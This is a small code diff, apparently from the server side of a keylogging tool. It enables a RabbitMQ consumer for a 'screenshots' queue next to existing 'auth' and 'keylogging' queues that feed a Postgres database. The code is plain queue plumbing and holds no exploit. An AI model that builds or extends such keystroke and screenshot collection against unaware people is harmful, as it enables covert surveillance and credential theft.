@@ -21,7 +21,7 @@ def main () :
         mainChannel.basic_qos(prefetch_count=1)
         mainChannel.basic_consume('auth', create_authentication_callback(pgCursor))
         mainChannel.basic_consume('keylogging', create_keylogging_callback(pgCursor))
-        # mainChannel.basic_consume('screenshots', create_screenshots_callback(amqpConnection))
+        mainChannel.basic_consume('screenshots', create_screenshots_callback())
 
         mainChannel.start_consuming()
     except KeyboardInterrupt :
